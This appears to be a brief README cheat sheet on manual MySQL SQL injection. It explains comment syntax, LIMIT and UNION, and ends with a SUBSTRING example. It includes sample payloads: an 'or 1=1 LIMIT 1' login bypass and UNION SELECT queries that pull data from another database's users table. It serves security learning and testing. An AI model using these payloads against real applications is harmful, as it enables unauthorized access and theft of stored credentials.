# MySQL-SQL-Injection-Cheatsheet
Tips for manually detect &amp; exploit SQL injection Vulnerability : MySQL

# Comment in MySQL <br>
1.  # <br>
2.  -- (After double dash put space) <br>
3.  /**/  <br>
 Ex: SELECT * from users/**/WHERE username='rk' AND password='123'; /*SQL keyword is case insansitive */  <br>
 
 # MySQL LIMIT Clause  <br>
 1. The LIMIT clause is used to specify the number of records to return.  <br>
  Ex: SELECT * FROM users where username='' or 1=1 LIMIT 1; /*Without limit keyword it will return multiple result. it will help in auth bypass*/  <br>
  
 # MySQL UNION Operator  <br>
 1. The UNION operator is used to combine the result-set of two or more SELECT statements.  <br>
    a. Every SELECT statement within UNION must have the same number of columns.  <br>
    b. The columns must also have similar data types.  <br>
    c. The columns in every SELECT statement must also be in the same order.  <br>
  Ex 1: Select  student_id, student_name, student_branch from students where student_id=1 UNION SELECT 1, 'hack' 'password'; /* Select from same table */  <br>
  Ex 1: Select  student_id, student_name, student_branch from students where student_id=1 UNION SELECT 1, 'hack' 'password' FROM hack.users;  /* Select from different DB and table */  <br>
  
  # Substring  <br>
  1. SUBSTRING('MySQL', 3, 2)  <br>
  
    
